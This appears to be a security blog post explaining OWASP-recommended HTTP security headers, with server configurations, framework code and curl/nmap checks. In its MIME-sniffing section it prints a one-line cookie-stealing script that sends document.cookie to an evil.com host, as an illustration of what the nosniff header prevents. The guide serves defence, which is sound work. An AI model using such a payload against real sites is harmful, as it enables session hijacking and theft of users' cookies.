+++
draft = false
title = "Understanding OWASP Secure Headers: HTTP Security Headers & Best Practices"
description = "A comprehensive guide to OWASP Secure Headers, covering essential HTTP security headers, implementation strategies, and best practices to secure web applications against common threats."
keywords = ["OWASP Secure Headers", "HTTP security headers", "web security best practices", "Content Security Policy", "HSTS", "X-Frame-Options", "X-Content-Type-Options", "Referrer-Policy", "Permissions-Policy", "Cache-Control", "web application security", "secure headers implementation", "OWASP OSHP", "security header configuration", "web security headers"]
author = "bloodstiller"
date = 2025-06-24
toc = true
bold = true
next = true
tags = ["OWASP", "Web Security", "HTTP Headers", "Security Headers", "Content Security Policy", "HSTS", "CSP", "X-Frame-Options", "X-Content-Type-Options", "Referrer-Policy", "Permissions-Policy", "Cache-Control", "Web Application Security", "Security Best Practices"]
+++

## Introduction: {#introduction}

The OWASP Secure Headers Project (OSHP) is a comprehensive initiative that provides guidance on implementing HTTP security headers to enhance web application security. These headers act as a crucial layer of defense, helping to prevent common web vulnerabilities and protect users from various attack vectors.

As penetration testers/security professionals, understanding and implementing these headers is often an essential part of remediation guidance as well as an integral part of securing our own applications and systems.


### What are HTTP Security Headers? {#what-are-http-security-headers}

HTTP security headers are response headers that instruct web browsers to enforce specific security policies. They provide defense-in-depth by controlling how browsers handle content, enforce security policies, and protect against common attack vectors such as:

-   Cross-Site Scripting (XSS)
-   Clickjacking
-   MIME type sniffing attacks
-   Protocol downgrade attacks
-   Cross-site request forgery (CSRF)


### The OWASP Secure Headers Project Mission {#the-owasp-secure-headers-project-mission}

Luckily for us OWASP have the Secure Headers Project (OSHP) which provides comprehensive guidance and configurations for helping implement these secure headers.

-   <https://owasp.org/www-project-secure-headers/>

The OSHP also aims to:

-   Provide comprehensive guidance on recommended HTTP security headers
-   Identify headers that should be removed or avoided
-   Offer validation tools for security header configurations
-   Provide code libraries for implementation
-   Track global usage statistics of security headers


## Active Security Headers: {#active-security-headers}

The following headers are currently active (listed as part of the OSHP project) and recommended for implementation.

We will break down each one to make it easier to understand what they do and how they offer protection.


### Strict-Transport-Security (HSTS) {#strict-transport-security--hsts}

HTTP Strict Transport Security (HSTS) is a powerful response header that instructs browsers to only communicate with your site over secure HTTPS connections. This helps prevent **protocol downgrade attacks** and **cookie hijacking**.

When a browser sees the HSTS header, it remembers (for a duration you define) that it must refuse any HTTP connection to your domain, even if the user manually types `http://`.


#### Header Values: {#header-values}

| Directive           | Description                                                 |
|---------------------|-------------------------------------------------------------|
| `max-age=SECONDS`   | Duration (in seconds) the browser should enforce HTTPS only |
| `includeSubDomains` | Extend the rule to all subdomains                           |
| `preload`           | Request inclusion in browser preload lists (see below)      |


#### Implementation Examples: {#implementation-examples}

```cfg
# Basic HSTS (1 year duration)
Strict-Transport-Security: max-age=31536000

# Include subdomains for full domain coverage
Strict-Transport-Security: max-age=31536000; includeSubDomains

# Recommended: full HSTS with preload flag
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```


#### Security Considerations: {#security-considerations}

+Important+: The HSTS header **only takes effect over HTTPS**. If a user visits your site via HTTP first, and you haven't redirected them to HTTPS, the header won't be seen or respected.

The `preload` flag can be used to submit your domain to <https://hstspreload.org>, allowing browsers to enforce HTTPS from the first visit—before any connection is made. Be cautious: once preloaded, removing HSTS can be difficult and slow to propagate.


#### Testing HSTS Implementation: {#testing-hsts-implementation}

Many automated scanners (e.g., Nessus, Nikto, Burp Suite) will check for HSTS headers by default. You can also verify it manually with `curl` or `nmap`.

```bash
# Using curl to check for the HSTS header
curl -I https://example.com | grep -i strict-transport-security

# Scan headers with nmap
nmap --script http-security-headers -p 443 example.com
```

-   See also: <https://nmap.org/nsedoc/scripts/http-security-headers.html>


### X-Frame-Options (XFO): {#x-frame-options--xfo}

The `X-Frame-Options` (XFO) header helps protect against **clickjacking attacks** by controlling whether your content can be embedded within an `<iframe>`. Without it, attackers could load your site invisibly within a frame and trick users into interacting with it unknowingly.

Although still respected by many browsers, this header is largely considered **legacy** and is being replaced by the more flexible `Content-Security-Policy: frame-ancestors`.


#### Implementation Options: {#implementation-options}

```cfg
# Deny all framing (most secure)
X-Frame-Options: DENY

# Allow framing by pages on the same origin
X-Frame-Options: SAMEORIGIN

# Allow from specific origin (deprecated and no longer supported by modern browsers)
X-Frame-Options: ALLOW-FROM https://trusted-site.com
```

+Important Note+: According to OWASP guidance:

> The `Content-Security-Policy` (CSP) `frame-ancestors` directive **obsoletes** the `X-Frame-Options` header. If both are present, `frame-ancestors` takes precedence and the `X-Frame-Options` header will be ignored.


#### Modern Alternative: CSP frame-ancestors: {#modern-alternative-csp-frame-ancestors}

The recommended modern approach is to use the `frame-ancestors` directive in your Content Security Policy. This provides greater flexibility and support for multiple trusted origins.

```cfg
# Completely disallow framing from any origin
Content-Security-Policy: frame-ancestors 'none';

# Allow framing only from your own domain
Content-Security-Policy: frame-ancestors 'self';

# Allow multiple trusted sources
Content-Security-Policy: frame-ancestors 'self' https://trusted-partner.com;
```


### X-Content-Type-Options: {#x-content-type-options}

The `X-Content-Type-Options` header helps prevent **MIME type sniffing**, a technique used by some browsers to guess a file’s content type if the server-supplied `Content-Type` seems ambiguous.

When set to `nosniff`, this header instructs browsers to strictly follow the `Content-Type` declared by the server and **not try to "guess"** or interpret files as a different type. This mitigates risks like executing a malicious script served with a misleading MIME type.

```cfg
X-Content-Type-Options: nosniff
```


#### What Is MIME Sniffing? {#what-is-mime-sniffing}

Browsers try to be "helpful" by sniffing the actual content of a file to determine its type, even if the server explicitly tells the browser, "Hey this is a text file."

For example, if a server sends a file with `Content-Type: text/plain`, but the browser detects JavaScript content, some browsers might treat it as `application/javascript` and execute it.

This is where the `X-Content-Type-Options: nosniff` header comes in. It tells the browser: "Don’t guess. Only trust the `Content-Type` that I, the server, tells you."


#### An Example Exploit Scenario (Without `nosniff` enabled): {#an-example-exploit-scenario--without-nosniff-enabled}

Say you have a website, that you allow users to upload images to like `.png`, `.jpg` etc. Now, say someone uploads a malicious JavaScript file but renames it to `profile.png` and your backend accepts the file and serves it with a generic or incorrect MIME type `Content-Type: image/png`

However, as this file actually contains JavaScript what happens if `X-Content-Type-Options` is missing?

Well some browsers might inspect the content of `profile.png` and **sniff** that it’s actually JavaScript, and if the file is embedded or linked in a way that allows script execution through a `<script src="...">` etc, the browser may **execute the script**.

This could lead to:

-   **Cross-site scripting (XSS)** if the malicious file is embedded in a page.
-   **Session hijacking**, **cookie theft**, or **CSRF** attacks.
-   **Drive-by downloads**, where a user is tricked into downloading and running malicious code just by visiting a URL.


#### An Example of Drive-by Scenario (Without `nosniff` enabled): {#an-example-of-drive-by-scenario--without-nosniff-enabled}

Suppose you have a document-sharing feature and host files at: <https://example.com/files/user-uploaded.pdf> but an attacker uploads a malicious file disguised as a PDF named `invoice.pdf`. And your webserver serves it as `Content-Type: application/pdf`

But its actual content is a cookie stealer like below.

```js
  <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
```

If `X-Content-Type-Options` is **missing**, and the user visits:

```cfg
<iframe src="https://example.com/files/invoice.pdf"></iframe>
```

Some browsers may sniff the file and execute the script, turning a benign file-hosting service into a drive-by attack vector allowing attackers to steal cookies without any interaction.


#### Best Practice: {#best-practice}

Always use this header, especially when serving user uploaded files or dynamic content to reduce the risk of drive-by downloads or cross-site scripting via unexpected file interpretation.

```cfg
X-Content-Type-Options: nosniff
```

This will ensure browsers do **not override the declared MIME type** that is provided by the web server &amp; prevent the browser from accidentally executing files as scripts.

It can help protect against:

-   XSS from mislabeled files
-   Drive-by downloads
-   Content spoofing


### Content-Security-Policy (CSP): {#content-security-policy--csp}

CSP is one of the most powerful security headers, allowing fine-grained control over resource loading and execution.

+Important+: Testing **HAS** to be conducted after defining this policy, as if misconfigured it could disable inline JavaScript &amp; CSS effectively disabling elements of the site. However a properly defined CSP can help prevent several different attack vectors such as cross-site scripting (XSS), click jacking and other cross-site injection attacks.


#### CSP Directives Explained {#csp-directives-explained}

| Directive                 | Purpose                                                             | Example                          |
|---------------------------|---------------------------------------------------------------------|----------------------------------|
| base-uri                  | Define the base URI for relative URIs                               | 'self'                           |
| default-src               | Fallback for other directives                                       | 'self'                           |
| script-src                | Controls JavaScript sources                                         | 'self' 'unsafe-inline'           |
| object-src                | Controls allowed plugin/object/embed sources                        | 'none'                           |
| style-src                 | Controls CSS sources                                                | 'self' 'unsafe-inline'           |
| img-src                   | Controls image sources                                              | 'self' data: https:              |
| media-src                 | Controls video and audio sources                                    | media.example.com                |
| frame-src                 | (Deprecated) Controls frame sources                                 | frame.example.com                |
| child-src                 | Controls nested browsing contexts (e.g., iframes)                   | 'self'                           |
| frame-ancestors           | Controls where the page can be embedded (anti-clickjacking)         | 'none'                           |
| font-src                  | Controls font sources                                               | 'self' fonts.gstatic.com         |
| connect-src               | Controls fetch/XHR/WebSocket endpoints                              | api.example.com                  |
| manifest-src              | Controls manifest sources                                           | 'self'                           |
| form-action               | Restricts form submission destinations                              | 'self'                           |
| sandbox                   | Enables sandboxing of content with optional restrictions            | allow-scripts allow-forms        |
| script-nonce              | Requires script tags to have a matching nonce                       | 'nonce-abc123'                   |
| plugin-types              | Limits allowed plugin MIME types                                    | application/pdf                  |
| reflected-xss             | (Deprecated) Instructs browser XSS filters                          | 'block'                          |
| block-all-mixed-content   | (Deprecated) Blocks loading of mixed (HTTP) content on HTTPS pages  | —                                |
| upgrade-insecure-requests | Instructs the browser to upgrade HTTP resources to HTTPS            | —                                |
| referrer                  | (Deprecated) Controls the Referer header sent                       | no-referrer                      |
| report-uri                | (Deprecated) Specifies where to send CSP violation reports          | <https://example.com/csp-report> |
| report-to                 | Defines reporting group (see `Report-To` header) for CSP violations | default-group                    |

+Note+:

-   (`—`) used where the directive doesn't require a value (it's boolean or behavior-based).
-   Deprecated directives are marked as such but still listed for completeness.


#### Basic CSP Implementation: {#basic-csp-implementation}

Here is a basic CSP implementation example.

```cfg
# Restrictive CSP policy
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'unsafe-inline';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self';
  connect-src 'self';
  frame-ancestors 'none';
```

**Explanation**:

-   `'self'` ensures content is loaded only from the same origin.
-   `unsafe-inline` is **not recommended** in production, but included here for compatibility (e.g., legacy inline scripts).
-   `frame-ancestors 'none'` helps mitigate clickjacking.


#### Real-World Example: Google's CSP. {#real-world-example-google-s-csp-dot}

To give more context lets look at googles CSP see how a large-scale company implements CSP in production:

```bash
curl -I https://google.com | grep -i content-security-policy
```

It returns something like (I say something like as the `nonce` value is generated per-request)

```cfg
content-security-policy-report-only:
    object-src 'none';
    base-uri 'self';
    script-src 'nonce-yxMLgEOc8rmGppxMx2uhMw' 'strict-dynamic' 'report-sample' 'unsafe-eval' 'unsafe-inline' https: http:;
    report-uri https://csp.withgoogle.com/csp/gws/other-hp
```

**What Google's CSP is doing**:

-   `report-only`: This means the policy is **not enforced**, but violations are reported. Useful for testing.
-   `object-src 'none'`: Disables plugins like Flash or Java (rarely used today, but still blocked explicitly).
-   `base-uri 'self'`: Prevents attackers from changing the base URL and tricking relative paths.
-   `script-src` breakdown:
    -   `nonce-...`: Allows only scripts with a matching nonce (random value generated per request).
    -   `strict-dynamic`: Works with nonces and ignores sources unless explicitly trusted.
    -   `report-sample`, `unsafe-inline`, `unsafe-eval`: Allows reporting of inline script samples, while still allowing some inline scripts, likely for backward compatibility or A/B testing.
    -   `https: http:`: Scripts can be loaded from any HTTPS or HTTP origin (still quite permissive).
-   `report-uri`: Violations are sent to Google's own CSP reporting endpoint.

<!--listend-->

-   Google uses `Content-Security-Policy-Report-Only` to monitor violations without blocking content, which is common in complex sites with dynamic script generation.
-   Their use of nonces and `strict-dynamic` is a modern best practice, as it allows precise control over which scripts execute, without the need for whitelisting entire domains.
-   The presence of `unsafe-inline` and `unsafe-eval` shows the tension between security and compatibility. However, Google is collecting violation data while working toward tighter enforcement.


#### CSP Testing and Validation: {#csp-testing-and-validation}

You can view, as you have seen the CSP for a site by curling and grepping for the source, however you can also check a CSP before implemenation by using <https://csp-evaluator.withgoogle.com>

```bash
# Test CSP headers
curl -I https://google.com | grep -i content-security-policy

# Validate CSP policy online
# Visit: https://csp-evaluator.withgoogle.com/
```


### X-Permitted-Cross-Domain-Policies: {#x-permitted-cross-domain-policies}

The `X-Permitted-Cross-Domain-Policies` header tells clients, primarily legacy technologies like Adobe Flash and Adobe Acrobat how to handle **cross-domain data loading** via the `crossdomain.xml` policy file.

Although Flash is now deprecated, this header still plays a role in securing environments where older clients, browser plugins, or embedded PDF viewers may be in use.


#### Implementation Options: {#implementation-options}

```cfg
# Most secure: completely disallow all cross-domain policy files
X-Permitted-Cross-Domain-Policies: none

# Allow only the policy file located at the root (/crossdomain.xml)
X-Permitted-Cross-Domain-Policies: master-only

# Allow any cross-domain policy file (least secure; strongly discouraged)
X-Permitted-Cross-Domain-Policies: all

# Allow loading policy files by content type (legacy and rarely used)
X-Permitted-Cross-Domain-Policies: by-content-type

# Allow loading policy files via specific FTP filenames (very niche)
X-Permitted-Cross-Domain-Policies: by-ftp-filename
```


#### Security Considerations: {#security-considerations}

+Important+: This header is mainly relevant in older ecosystems, but still contributes to a strong **defense-in-depth** posture, especially if you're serving documents or files that may be opened in legacy contexts.

-   Use `none` unless you have a **clear, legacy-driven requirement.**
-   Avoid `all`, `by-content-type`, or `by-ftp-filename`, as these increase attack surface by allowing overly permissive policy file access.


#### Testing Implementation: {#testing-implementation}

You can validate the presence of this header using command-line tools:

```bash
# Check for the header in server responses
curl -I https://example.com | grep -i x-permitted-cross-domain-policies

# Use nmap to scan for security headers
nmap --script http-security-headers -p 443 example.com
```

-   <https://nmap.org/nsedoc/scripts/http-security-headers.html>


### Referrer-Policy: {#referrer-policy}

The `Referrer-Policy` header controls how much **referrer information** is included in outbound HTTP requests, such as when a user clicks a link or loads an image or script from another site.

By default, browsers may send the full URL of the referring page, which can expose sensitive data in query strings (e.g. `/reset-password?token=xyz`). This header helps mitigate that risk by letting you restrict how much information gets shared, especially in ****cross-origin**** contexts.


#### Policy Options: {#policy-options}

| Policy                            | Same-Origin Requests | Cross-Origin Requests  | Notes                                    |
|-----------------------------------|----------------------|------------------------|------------------------------------------|
| `unsafe-url`                      | Full URL             | Full URL               | Least private; exposes everything        |
| `origin`                          | Origin only          | Origin only            | Safer; hides path/query details          |
| `strict-origin`                   | Origin only          | Origin only (if HTTPS) | Strips referrer unless HTTPS → HTTPS     |
| `strict-origin-when-cross-origin` | Full URL             | Origin only (if HTTPS) | Good balance; default in modern browsers |
| `no-referrer`                     | No referrer          | No referrer            | Most secure and private                  |

```cfg
# Example: Send full referrer (not recommended)
Referrer-Policy: unsafe-url

# Example: Send no referrer at all
Referrer-Policy: no-referrer

# Example: Recommended default
Referrer-Policy: strict-origin-when-cross-origin
```

+Best Practice+: `strict-origin-when-cross-origin` is widely considered the safest **default** as it sends full referrer to your own site, but only the origin to third-party domains, and never leaks anything when moving from HTTPS to HTTP.


### Clear-Site-Data: {#clear-site-data}

The `Clear-Site-Data` header instructs the browser to delete certain types of locally stored data when it receives the header in an HTTPS response. This can be useful after logout, user account deletion, or major application updates to prevent stale or sensitive data from lingering in the browser.

This header only works over **secure connections (HTTPS)** and is supported in most modern browsers.


#### Example: {#example}

```cfg
Clear-Site-Data: "cache", "cookies", "storage"
```

This example clears:

-   **cache**: HTTP disk and memory caches
-   **cookies**: Cookies associated with the origin
-   **storage**: Persistent storage (e.g. localStorage, IndexedDB, service workers)


#### Available Directives: {#available-directives}

| Directive             | Description                                                   |
|-----------------------|---------------------------------------------------------------|
| `"cache"`             | Clears the browser's cache for the origin                     |
| `"cookies"`           | Deletes cookies for the origin                                |
| `"storage"`           | Clears localStorage, sessionStorage, IndexedDB, serviceWorker |
| `"executionContexts"` | Resets JS execution contexts (rarely used)                    |
| `"*"`                 | Clears **all** data types listed above (wildcard)             |


#### Use Cases: {#use-cases}

-   Clearing user data after logout or account deletion.
-   Resetting site state after a security incident or bug.
-   Preventing old cached scripts/styles from interfering after deployment.

+Important+: This header is non-blocking as it instructs the browser to delete data after the response is received. If you need to revoke tokens or end sessions immediately, combine this with server-side logic.


### Cross-Origin Headers: {#cross-origin-headers}

These headers are designed to control how your site interacts with resources across different origins. They help enforce **isolation**, **resource sharing policies**, and protect against **side-channel attacks**, such as Spectre.

Together, they form part of what's known as a "secure cross-origin isolation policy" when used correctly.


#### Cross-Origin-Embedder-Policy (COEP): {#cross-origin-embedder-policy--coep}

The `Cross-Origin-Embedder-Policy` header determines whether your document can load cross-origin resources like images, scripts, or iframes. When set to `require-corp`, it blocks all cross-origin resources **unless** they explicitly grant permission via CORS or `Cross-Origin-Resource-Policy`.

```cfg
Cross-Origin-Embedder-Policy: require-corp
```


#### Cross-Origin-Opener-Policy (COOP): {#cross-origin-opener-policy--coop}

The `Cross-Origin-Opener-Policy` header isolates your document from other browsing contexts. This prevents other tabs or windows (even from the same origin) from accessing your context unless they meet specific criteria.

This is crucial for protecting `window.opener` references and enabling secure performance isolation.

```cfg
Cross-Origin-Opener-Policy: same-origin
```


#### Cross-Origin-Resource-Policy (CORP): {#cross-origin-resource-policy--corp}

The `Cross-Origin-Resource-Policy` header allows resources to **opt-in** to cross-origin requests. This is typically used on the resource side (e.g., APIs, fonts, images) to declare where the resource is allowed to be embedded.

```cfg
Cross-Origin-Resource-Policy: same-origin
```


#### Comparison Table: {#comparison-table}

| Header                         | Purpose                                                   | Typical Value                              | Applied To             |
|--------------------------------|-----------------------------------------------------------|--------------------------------------------|------------------------|
| `Cross-Origin-Embedder-Policy` | Controls which cross-origin resources can be embedded     | `require-corp`                             | HTML documents         |
| `Cross-Origin-Opener-Policy`   | Isolates tabs/windows to prevent shared browsing contexts | `same-origin`                              | HTML documents         |
| `Cross-Origin-Resource-Policy` | Declares who can embed or fetch a resource                | `same-origin`, `cross-origin`, `same-site` | Fonts, scripts, images |


#### Use Case: Enabling Cross-Origin Isolation {#use-case-enabling-cross-origin-isolation}

To enable **cross-origin isolation**, which is required for advanced browser features like `SharedArrayBuffer`, you must set both `COEP` and `COOP`:

```cfg
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Opener-Policy: same-origin
```

This setup ensures your page is isolated from other browsing contexts and can safely use high resolution timers and other powerful APIs.


### Permissions-Policy: {#permissions-policy}

The `Permissions-Policy` header (formerly `Feature-Policy`) lets you control which browser features, APIs, and sensors are allowed to be used in your site, or in embedded content like iframes.

This is useful for hardening security, reducing unnecessary attack surface, and improving privacy (e.g., disabling camera/microphone access).

In this example, geolocation, microphone, and camera access are disabled for all origins, including the page’s own origin.

```cfg
Permissions-Policy: geolocation=(), microphone=(), camera=()
```

**Restrict in iframes only**:

```cfg
Permissions-Policy: camera=(self), microphone=(self)
```

This allows the main origin to access the APIs, but blocks them in any embedded iframe.


#### Common Directives: {#common-directives}

| Feature       | Description                                 |
|---------------|---------------------------------------------|
| `geolocation` | Access to location data                     |
| `microphone`  | Microphone access (e.g., WebRTC)            |
| `camera`      | Camera access                               |
| `fullscreen`  | Allow fullscreen API usage                  |
| `payment`     | Payment Request API                         |
| `usb`         | WebUSB API                                  |
| `vibrate`     | Access to vibration feature (mostly mobile) |

+Tip+: Use this policy to ****limit powerful browser APIs**** to trusted origins only, especially in dynamic content or third-party embeds.


### Cache-Control: {#cache-control}

The `Cache-Control` header defines how, and for how long, browsers and intermediaries (like CDNs or proxies) cache responses.

This plays a major role in both performance optimization and security, especially for sensitive content like authenticated pages or API responses.


#### Common Directives: {#common-directives}

| Directive         | Description                                              |
|-------------------|----------------------------------------------------------|
| `no-store`        | Never store this response (e.g., for sensitive content)  |
| `no-cache`        | Validate with server before using cached version         |
| `private`         | Cache only in user's browser, not shared caches          |
| `public`          | Can be cached by any cache (browser, CDN, proxy)         |
| `max-age=SECONDS` | Maximum time a resource is considered fresh (in seconds) |
| `must-revalidate` | Must revalidate with server once expired                 |


#### Examples: {#examples}

```cfg
# Prevent any caching (good for sensitive responses like logout)
Cache-Control: no-store

# Cache for 10 minutes in browser only
Cache-Control: private, max-age=600

# Allow CDN/proxies to cache for 1 day
Cache-Control: public, max-age=86400
```

+Security Tip+: Use `no-store` for any page or endpoint that handles authentication, personal data, tokens, or logout to avoid sensitive data being cached locally or by proxies.


## Deprecated Headers: {#deprecated-headers}

The following headers are deprecated and should not be used:


### X-XSS-Protection {#x-xss-protection}

+Deprecated+: Modern browsers have deprecated this header in favor of CSP.

```cfg
# Do NOT use this header
X-XSS-Protection: 1; mode=block
```


### Feature-Policy: {#feature-policy}

+Deprecated+: Replaced by Permissions-Policy.

```cfg
# Do NOT use this header
Feature-Policy: geolocation 'self'
```


### Public-Key-Pins (HPKP) {#public-key-pins--hpkp}

+Deprecated+: Replaced by Certificate Transparency and modern TLS features.

```cfg
# Do NOT use this header
Public-Key-Pins: max-age=2592000; pin-sha256="...";
```


## Implementation Guide: {#implementation-guide}

These examples and guides will need to be altered and modified depending on your environment. They are purely illustrative and serve as a flexible framework to follow when implementing secure headers.


### Apache Configuration: {#apache-configuration}

```cfg
# Add to .htaccess or server configuration
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
Header always set X-Frame-Options "DENY"
Header always set X-Content-Type-Options "nosniff"
Header always set Referrer-Policy "strict-origin-when-cross-origin"
Header always set Permissions-Policy "geolocation=(), microphone=(), camera=()"
Header always set Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'"
```


### Nginx Configuration: {#nginx-configuration}

```cfg
# Add to server block
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'" always;
```


### Node.js/Express Implementation: {#node-dot-js-express-implementation}

```javascript
const helmet = require('helmet');

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      fontSrc: ["'self'"],
      connectSrc: ["'self'"],
      frameAncestors: ["'none'"]
    }
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  permissionsPolicy: {
    features: {
      geolocation: [],
      microphone: [],
      camera: []
    }
  }
}));
```


### Python/Flask Implementation: {#python-flask-implementation}

```python
from flask import Flask
from flask_talisman import Talisman

app = Flask(__name__)

csp = {
    'default-src': ["'self'"],
    'script-src': ["'self'", "'unsafe-inline'"],
    'style-src': ["'self'", "'unsafe-inline'"],
    'img-src': ["'self'", "data:", "https:"],
    'font-src': ["'self'"],
    'connect-src': ["'self'"],
    'frame-ancestors': ["'none'"]
}

Talisman(app,
         content_security_policy=csp,
         force_https=True,
         strict_transport_security=True,
         strict_transport_security_max_age=31536000,
         strict_transport_security_include_subdomains=True,
         strict_transport_security_preload=True)
```


## Testing and Validation {#testing-and-validation}


### Manual Testing: {#manual-testing}

We can easily test what headers are in place and their values by using `curl`.

```bash
# Test all security headers
curl -I https://example.com

# Test specific headers
curl -I https://example.com | grep -E "(Strict-Transport-Security|Content-Security-Policy|X-Frame-Options|X-Content-Type-Options)"

# Test with different user agents
curl -I -H "User-Agent: Mozilla/5.0" https://example.com
```


### Automated Testing Tools: {#automated-testing-tools}


#### Free Online Security Header Validation Tools: {#free-online-security-header-validation-tools}

You can interact with them graphically or make calls via `curl`

-   **Security Headers**: <https://securityheaders.com>
-   **Mozilla Observatory**: <https://observatory.mozilla.org>

<!--listend-->

```bash
# Using securityheaders.com API
curl -X GET "https://securityheaders.com/?q=example.com&hide=on&followRedirects=on"

# Using Mozilla Observatory
curl -X GET "https://developer.mozilla.org/en-US/observatory/analyze?host=example.com"
```

This can easily be scripted as-well if several sites need to be checked.

```shell

# List of domains
urls=("example.com" "mozilla.org" "wikipedia.org")

# Loop through each URL
for url in "${urls[@]}"; do
  echo "Analyzing $url"
  curl -s -X GET "https://developer.mozilla.org/en-US/observatory/analyze?host=$url"
 #curl -s -X GET "https://securityheaders.com/?q=$url&hide=on&followRedirects=on"
  echo -e "\n"
done
```


#### Automated Tools: {#automated-tools}

Burp Suite, Nessus &amp; Nikto all provide security header checking.


#### Nmap Scripts: {#nmap-scripts}

Good ol' nmap provides a nice script that allows us to easily check security headers.

```bash
# Comprehensive security header scan
nmap --script http-security-headers -p 443 example.com

# Specific header enumeration
nmap --script http-headers -p 443 example.com
```


## Security Headers Best Practices: {#security-headers-best-practices}

This section outlines a practical approach to deploying, monitoring, and maintaining security headers in real-world environments.


### Implementation Strategy: {#implementation-strategy}

1.  **Start with Core Security Headers**
    Begin by implementing high-impact, low-risk headers that provide immediate security benefits:
    -   `Strict-Transport-Security` (HSTS): Enforce HTTPS to prevent downgrade attacks.
    -   `X-Frame-Options`: Protect against clickjacking.
    -   `X-Content-Type-Options`: Prevent MIME-type sniffing.

2.  **Introduce CSP in Stages**
    Content-Security-Policy can be complex. Roll it out incrementally:
    -   Start in `report-only` mode to identify potential issues without breaking functionality.
    -   Monitor reports and refine your policy iteratively.
    -   Switch to enforcement mode once confident and stable.

3.  **Validate and Test**
    Ensure changes don’t introduce regressions:
    -   Test policies in staging environments before production.
    -   Use different browsers and device types for coverage.
    -   Watch for false positives or broken features during rollout.


## Tools and Resources: {#tools-and-resources}


### OWASP Secure Headers Project Tools: {#owasp-secure-headers-project-tools}

-   **GitHub Organization**: <https://github.com/owasp-secure-headers>


### Reference Documentation {#reference-documentation}

-   [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
-   [MDN Web Docs - HTTP Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)
-   [Content Security Policy Level 3](https://w3c.github.io/webappsec-csp/)
-   [HTTP Strict Transport Security RFC 6797](https://tools.ietf.org/html/rfc6797)
